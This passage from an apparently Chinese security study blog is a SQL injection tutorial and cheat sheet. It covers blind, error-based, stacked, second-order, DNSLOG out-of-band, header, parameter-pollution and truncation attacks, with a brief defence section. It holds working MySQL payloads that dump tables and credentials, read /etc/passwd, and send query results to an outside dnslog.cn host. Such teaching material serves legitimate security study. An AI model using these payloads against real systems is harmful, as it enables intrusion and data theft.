蔽正确的执行结果。最好的方法是将id的值变为一个不存在的值-1，这样最终查询到的就是我们union的结果了。</li></ul><h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p>盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注</p><p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为两类）</p><h6 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h6><p>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False</p><ul><li>关键函数<ul><li>left(a,b):截取a的前b位</li><li>substr(a,b,c):从b位置开始，截取字符串a的c长度</li><li>ascii(str):将某个字符转换为ASCII值</li><li>chr(),char():将ascii值转换为字符</li><li>ORD(str):同ascii()，返回字符串第一个字符的ascii值</li><li>mid(a,b,c)：从位置b开始，截取字符串a的c位</li><li>regexp’正则表达式’:有返回1，没有返回0</li></ul></li></ul><h6 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h6><blockquote><p>延时注入：sleep()、benchmark()、笛卡尔积、rlike等</p></blockquote><p>无论我们输入的语句是否合法，页面的显示信息是固定的，即不会出现查询的信息，也不会出现报错信息。可以尝试基于时间的盲注来测试。根据页面响应的时间，来判断输入的信息是否正确。 在可以判断返回正确还是错误的情况下，两种注入方法都可以用，延时注入更倾向于无法判断正误，通过自己构造页面刷新时间来判断正误。</p><blockquote><p>IF 表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> IF( expr1 , expr2 , expr3 )</span><br></pre></td></tr></table></figure><p>expr1 的值为 TRUE，则返回值为 expr2 expr1 的值为FALSE，则返回值为 expr3</p><p>利用payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> if (&#x27;判断语句&#x27;,&#x27;有关延时的函数&#x27;,1)</span><br></pre></td></tr></table></figure></blockquote><ul><li><p>关键函数</p><ul><li><p>sleep() </p></li><li><p>benchmark(10000000,md5(1)) 【 heavy query】</p></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">benchmark()是mysql内置的一个函数，用于测试函数或者表达式的执行速度。</span><br><span class="line"> 用法：benchmark(重复次数, 执行的函数)</span><br><span class="line"> &#x27;benchmark(t,exp)&#x27;</span><br><span class="line"> select benchmark(count,expr);  &#x27;是重复执行count次expr表达式，使得处理时间很长，来产生延迟&#x27;</span><br><span class="line"> </span><br><span class="line">比如</span><br><span class="line"> select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line"> select benchmark( 5000000, md5( &#x27;test&#x27; ));</span><br></pre></td></tr></table></figure><ul><li>笛卡尔积</li></ul><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from database.tableA,database.tableB</span><br></pre></td></tr></table></figure><p>就会对tableA,B进行笛卡尔运算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line"></span><br><span class="line">&#x27;笛卡尔积(因为连接表是一个很耗时的操作)&#x27;</span><br><span class="line"> AxB=A和B中每个元素的组合所组成的集合，就是连接表</span><br><span class="line"> SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C;</span><br><span class="line"> select * from table_name A, table_name B</span><br><span class="line"> select * from table_name A, table_name B，table_name C</span><br><span class="line"> select count(*) from table_name A, table_name B，table_name C 表可以是同一张表</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from OPENQUERY([mysql],&#x27;select if(ord(mid((select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 3,1),1,1))=97,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),0)&#x27;)</span><br></pre></td></tr></table></figure><ul><li>GET_LOCK() 加锁</li></ul><p>函数使用说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select GET_LOCK(&#x27;a&#x27;,10)</span><br></pre></td></tr></table></figure><p>注意：设置锁后，需要新开一个窗口并且是长连接才会有效。</p><ul><li>RLIKE正则</li></ul><p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br><span class="line">正则语法：</span><br><span class="line">. : 匹配任意单个字符</span><br><span class="line">* ： 匹配0个或多个前一个得到的字符</span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RPAD(str,len,padstr)</span><br><span class="line">用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len，那么它将被截除到 len个字符。</span><br><span class="line">mysql&gt; SELECT RPAD(&#x27;hi&#x27;,5,&#x27;?&#x27;); -&gt; &#x27;hi???&#x27;</span><br><span class="line">repeat(str,times)  复制字符串times次</span><br></pre></td></tr></table></figure><p>寻找新的延时函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure><p>这个代码相当于 sleep(5) hhh</p><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><hr><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a><strong>原理</strong></h6><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用。</p><p>经过精心构造的函数，让函数处理user()等不合规定的数据，引发mysql报错。最常用的是updatexml()，但必须打开错误提示 mysqli_error()（真实环境很少出现）</p><h6 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h6><hr><p><strong>extractvalue函数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    函数原型：extractvalue(xml_document,Xpath_string)</span><br><span class="line">    正常语法：extractvalue(xml_document,Xpath_string);</span><br><span class="line">    第一个参数：xml_document是string格式，为xml文档对象的名称</span><br><span class="line">    第二个参数：Xpath_string是xpath格式的字符串</span><br><span class="line">    作用：从目标xml中返回包含所查询值的字符串</span><br></pre></td></tr></table></figure><p>第二个参数是<strong>要求</strong>符合xpath语法的字符串，如果<strong>不满足要求</strong>，则会报错，并且将<strong>查询结果放在报错信息里</strong>，因此可以利用</p><p>payload：select extractvalue(“anything”,concat(‘~’,(<strong>select语句)</strong>))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    (select extractvalue(&quot;anything&quot;,concat(&#x27;~&#x27;,(select语句))))</span><br><span class="line">    对于mysql:</span><br><span class="line">    查数据库名：(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="line">    爆表名：(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</span><br><span class="line">    爆字段名：(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="line">    爆数据：(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>注：</p><p>① 0x7e&#x3D;’~’</p><p>② concat(‘a’,‘b’)&#x3D;“ab”</p><p>③ version()&#x3D;@@version</p><p>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</p><p>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p><p><strong>updatexml函数：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    爆数据库名：&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="line">    爆表名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))</span><br><span class="line">    爆列名：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="line">    爆数据：&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))</span><br></pre></td></tr></table></figure><h6 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h6><p><strong>基于BIGINT的数据溢出</strong></p><p><a href="https://blog.csdn.net/weixin_43902454/article/details/96495984">参考博客</a></p><p>只有5.5.5及其以上版本的MySQL才会产生<strong>溢出错误消息</strong>，之下的版本对于整数溢出不会发送任何消息。 本文的攻击之所以得逞，是<strong>因为mysql_error()会向我们返回错误消息</strong>，只要这样，我们才能够利用它来进行注入。此外，后端代码中的引用、双引号或括号问题，也会引起注入攻击。</p><p><strong>数据的溢出</strong></p><blockquote><p>数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。为了避免出现上面这样的错误，我们只需将其转换为无符号整数即可。</p><p>对于无符号整数来说，BIGINT可以存放的最大值用二进制、十六进制和十进制表示的话，分别为“0b1111111111111111111111111111111111111111111111111111111111111111”、“0xFFFFFFFFFFFFFFFF”和“18446744073709551615”。同样的，如果对这个值进行数值表达式运算，如加法或减法运算，同样也会导致“BIGINT value is out of range”错误。</p><p>如果我们对数值0逐位取反，结果会怎么样呢？ 当然是得到一个无符号的最大BIGINT值，这一点是显而易见的。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508143729585.png"></p></blockquote><p>我们对~0进行加减运算的时候就会导致BIGINT溢出错误</p><p><strong>注入原理</strong></p><p>利用子查询引起BITINT溢出，从而设法提取数据。我们知道，如果一个查询成功返回，其返回值为0，所以对其进行逻辑非的话就会变成1，举例来说，如果我们对类似(select*from(select user())x)这样的查询进行逻辑非的话，就会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> mysql&gt; select (select*from(select user())x); +-------------------------------+  (select*from(select user())x)  +-------------------------------+  root@localhost  +-------------------------------+ 1 row in set (0.00 sec) #Applying logical negation ​ mysql&gt; select !(select*from(select user())x); +--------------------------------+  !(select*from(select user())x)  +--------------------------------+  1  +--------------------------------+ 1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><blockquote><p>这里<code>select user())x</code>里面的x指的是把查询的数据放到x这个变量里面</p></blockquote><p>只要我们能够组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> mysql&gt; select ~0+!(select*from(select user())x); ERROR 1690 (22003): BIGINT value is out of range in &#x27;(~(0) + (not((select &#x27;root@localhost&#x27; from dual))))&#x27;</span><br></pre></td></tr></table></figure><p><strong>获取数据</strong></p><p>表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> !(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</span><br></pre></td></tr></table></figure><p>列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select !(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x)-~0;</span><br></pre></td></tr></table></figure><p>数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> !(select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x)-~0;</span><br></pre></td></tr></table></figure><hr><p><strong>整形溢出报错注入原理exp</strong></p><p>exp()即为以e为底的对数函数，即求解e的710次方，当传递一个大于709的值时，函数exp()就会引起一个溢出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> mysql&gt; select exp(710); ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure><p>exp(<del>0) ~表示按位取反，则select exp(</del>0) 一定会出错</p><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> exp(~(select*from(select load_file(&#x27;/etc/passwd&#x27;))a)) exp(~(select*from(select user())x)) exp(~(select * from (select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x))</span><br></pre></td></tr></table></figure><blockquote><p>对于第二条语句：</p><p>1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a</p><p>2.然后在查询select * from a 查询x，将结果集a全部查询出来</p><p>3.查询完成，语句成功执行，返回值为0，再取反获取，是exp调用的时候报错</p></blockquote><p>注：当版本大于5.5.53时，不能返回查询结果</p><h6 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a>主键重复报错</h6><p>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()</p><blockquote><p>关键函数： Rand() ——-产生0~1的伪随机数 Floor() ——-向下取整数 Concat() —–连接字符串 Count() ——计算总数</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Payload如下：  Select count(*),concat(**PAYLOAD**,floor(rand(0)*2))x from 表名 group by x;</span><br></pre></td></tr></table></figure><p>首先rand（0）的作用是产生0~1的随机数，但这个随机数列是伪随机数，也可以说是一组固定的值，当我们对这组随机数乘2后，得到的也是一组固定的值，然后我们使用floor（）函数，向下取整，得到了一组十分重要的数列（011011011…….）无限重复，这个数列很重要！</p><p>接着，对于count（）和group by连用的情况。</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508161246452-1024x1002.png" style="zoom:67%;" /><p>但是，当遇上我们刚刚构造的011011这个神奇的数列的时候，就会出现一个大问题。这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错，当我们使用这个数列的时候会造成<strong>主键重复</strong>，抛出错误。</p><p>总结主键重复注入原理：</p><blockquote><p><strong>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</strong></p></blockquote><p>具体一点：floor(rand(0)*2)的数列固定了就是011011011…【伪随机数】</p><blockquote><p>就是group by与rand()使用时，如果临时表中没有该主键，则在插入前rand()会再计算一次（也就是两次，但有些博客写的是多次，这个多次到底是几次并不知道，但是以两次来理解下面的实验都能说的通）。就是这个特性导致了主键重复并报错。我们来看：</p><p>当group by 取第一条from 表记录时，此时group by的是’security0’，发现临时表中并没有’security0’的主键，注意，这个时候rand(0)*2会再计算一次，经floor()后，率先插入临时表的主键不是security0，而是security1，并计数1。</p><p>然后取第二条记录，第二条记录group by 的key中的01仍由floor(rand(0)<em>2)继续计算获得，也就是security1。此时临时表中已经有security1的主键了，所以count(</em>)直接加1就可以。</p><p><strong>继续从from的表中取第三条记录，再次计算floor(rand(0)*2)，结果为0，与database()拼接为security0，临时表的主键中并不存在，在插入前，floor(rand(0)*2)又计算一次，拼接后与secruity1，但是是直接插入，即使临时表中已经有了主键security1也硬要插入，从而导致主键重复报错</strong>，也就是：ERROR 1062 (23000): Duplicate entry ‘security1’ for key ‘group_key’。</p></blockquote><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ select count(*) from users group by concat(database(),floor(rand(0)*2)); select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/beepress-image-140616-1599533130.png"></p><p>注：这就造成database()被爆出来了。。</p><h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询 原理很简单，mysql_multi_query() 支持多条sql语句同时执行，就是个;分隔，成堆的执行sql语句，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 1 select * from users;show databases; </span><br></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够 虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p><p>常见的绕过有十六进制绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ...;SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</span><br></pre></td></tr></table></figure><h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>在第一次进行数据库插入数据的时候，仅仅只是对其中的特殊字符进行了转义，在后端代码 中可能会被转义，但在存入数据库时还是原来的数据，数据中一般带有单引号和＃号，然后下次使 用在拼凑SQL中，所以就形成了二次注入。</p><h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><ul><li>首先 new_user.php 页面获取数据并提交给 login_create.php 比如创建用户名为admin#的用户</li><li>login_create.php 收到数据【admin’#】后，进行转义【admin&#x2F;‘#】，然后直接将数据存放到数据库，但是数据库并 不会将转义的符号存放进数据库。【所以存进去的数据时admin’#】</li><li>修改密码页面内容【修改用户名为admin’#的密码为123456】</li><li>这个时候我们后端的SQL语句是：<code>update user set passwd=123456 where username=&#39;admin&#39;#&#39;&quot;</code>,成功把admin的密码改掉</li></ul><h5 id="DNSLOG注入"><a href="#DNSLOG注入" class="headerlink" title="DNSLOG注入"></a>DNSLOG注入</h5><p>前提：</p><ul><li>secure_file_priv 为空，具体在mysql.ini里修改 </li><li>load_file 可用</li><li>UNC路径，主要用于共享文件资源，格式 \servername\sharename\directory\filename</li></ul><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select load_file(concat(&#x27;\\\\&#x27;,(select  database()),&#x27;.fi9wbl.dnslog.cn\\123&#x27;));</span><br></pre></td></tr></table></figure><ul><li>1、四个 \ 其中为转义 代表两个 \</li><li>2、后面跟上我们要的信息</li><li>3、跟上我们的域名</li><li>4、最后还有个文件名，可以随意写，如 123</li></ul><p>注意：如果结果中有特殊符号，那么就带不出来，可以用 hex() ，将结果转成16进制再外带</p><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230508192714934-1024x926.png" style="zoom:67%;" /><h5 id="orderby注入"><a href="#orderby注入" class="headerlink" title="orderby注入"></a>orderby注入</h5><h5 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h5><p>只要与数据库交互都可以</p><ul><li>UA头部 User-Agent:’or updatexml(1,concat(0x23,database()),1) or’<br> 完整语句：<br> INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES<br> (‘’or (extractvalue(1,concat(0x7e,(select database()),0x7e))) or’’,<br> ‘127.0.0.1’, ‘admin’)</li></ul><hr><h4 id="其他攻击"><a href="#其他攻击" class="headerlink" title="其他攻击"></a>其他攻击</h4><hr><h5 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h5><p><strong>HTTP参数污染漏洞（HTTP Parameter Pollution）简称HPP</strong>，由于HTTP协议允许同名参数的存在，同时，后台处理机制对同名参数的处理方式不当，造成“参数污染”。攻击者可以利用此漏洞对网站业务造成攻击，甚至结合其他漏洞，获取服务器数据或获取服务器最高权限。</p><p>HPP发生在查询参数中，查询参数通常是指URI中“?”和URI结尾之间的部分，是一系列的域值对，可以参考RFC 3986查看其具体定义，这些域值对是通过“&amp;”分开的，例如：name&#x3D;admin&amp;password&#x3D;Test@123。如果用户输入的name的值为：admin&amp;password&#x3D;123,数据没有经过任何处理用于提交请求，那么这个URL就会被篡改为：name&#x3D;admin&amp;password&#x3D;123&amp;password&#x3D;Test@123。</p><p>下表是不同的Web服务器如何管理多次出现的同一参数。</p><p>HTTP后端</p><p>总体解析结果</p><p>例子</p><p>ASP.NET&#x2F;IIS</p><p>特定参数所有内容进行拼接</p><p>par1&#x3D;val1,val2</p><p>ASP&#x2F;IIS</p><p>特定参数所有内容进行拼接</p><p>par1&#x3D;val1,val2</p><p>PHP&#x2F;Apache</p><p><strong>最后一次出现的参数内容</strong></p><p><strong>par1&#x3D;val2</strong></p><p>PHP&#x2F;Zeus</p><p>最后一次出现的参数内容</p><p>par1&#x3D;val2</p><p>JSP,Servlet&#x2F;Apache Tomcat</p><p>第一次出现的参数内容</p><p>par1&#x3D;val1</p><h6 id="SQL注入应用"><a href="#SQL注入应用" class="headerlink" title="SQL注入应用"></a>SQL注入应用</h6><p>常规攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> http://webApplication/showproducts.asp?ID=9 UNION SELECT 1,2,3 FROM Users WHERE id=3 —</span><br></pre></td></tr></table></figure><p>使用HPP攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> http://webApplication/showproducts.asp?ID=9  /*&amp;ID=*/UNION /*&amp;ID=*/SELECT 1 &amp;ID=2  &amp;ID=3 FROM /*&amp;ID=*/Users /*&amp;ID=*/ WHERE id=3 —</span><br></pre></td></tr></table></figure><h5 id="SQL约束攻击"><a href="#SQL约束攻击" class="headerlink" title="SQL约束攻击"></a>SQL约束攻击</h5><h6 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h6><blockquote><p>在MySQL的配置选项中，有一个sql_mode选项。当MySQL的sql_mode设置为default时，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error（如果是error则插入不成功），这可能会导致发生一些“截断”问题。</p></blockquote><h6 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> sql-mode=&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot;</span><br></pre></td></tr></table></figure><blockquote><p> sql-mode&#x3D;”STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION”</p><p>在strict模式下，因为输入的字符串超出了长度限制，因此数据库返回一个error信息，同时数据插入不成功。</p><p>这个时候我们就没办法利用截断来注入</p></blockquote><p>还有一个前置条件:<code>在sql执行字符串处理时，字符串末尾的空格符将会被删除。也就是说</code>“admin”<code>和</code>“admin “<code>是相等的。例如用一下语句查询时，与使用</code>“admin”<code>进行查询时的结果是一样的。</code></p><h6 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h6><ul><li>攻击者注册名为’admin x’的账户，密码填写自己的密码，由于字符串超出长度限制，数据库把后面的x截断并成功插入数据。</li><li>攻击者紧接着登录自己的账号，账号密码校验成功，<code>return $row[&#39;username&#39;];</code>的时候返回了真正的admin账户的信息，造成越权。</li><li>注：当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注<strong>册的账户信息</strong>，但是注意此处的<code>return $row[&#39;username&#39;];</code>，虽然此时查询出来的是我们自己的用户信息，<strong>但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的</strong></li></ul><h6 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 1.将要求或者预期具有唯一性的那些列加上UNIQUE约束，由于&#x27;username&#x27;列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</span><br><span class="line">2.最好使用&#x27;id&#x27;作为数据库表的主键。并且数据应该通过程序中的id进行跟踪。</span><br><span class="line"> 3.限制输入长度。</span><br></pre></td></tr></table></figure><hr><h5 id="information-schema被ban"><a href="#information-schema被ban" class="headerlink" title="information_schema被ban"></a>information_schema被ban</h5><p><a href="https://blog.csdn.net/qq_43936524/article/details/116796087">参考</a></p><p>在得到目标数据库名字之后，一般使用information_schema可以查询想要的表名，列名，数据。单数当information_schema被ban的情况下，有其他的几个系统自带的表中也可以获得想要的信息。</p><h6 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h6><p><strong>sys.schema_auto_increment_columns</strong></p><p>在mysql 5.7以后新增了<code>schema_auto_increment_columns</code>这个视图去保存所有表中<strong>含有自增字段</strong>的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20210514162941494-1024x154.png"></p><p>可以看出不仅保存了<strong>表名和数据库名</strong>，还保存了自增字段的<strong>列名</strong>。 所以当我们通过<code>database()</code>获得数据库名后就可以利用这个视图去获得带有自增列的<strong>表名和列名</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select table_name,column_name from sys.schema_auto_increment_columns where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><p>而对于没有自增列的表名，我们也可以通过其他的视图去获得</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> select table_name from sys.schema_table_statistics_with_buffer where table_schema = &#x27;security&#x27;;</span><br></pre></td></tr></table></figure><figure 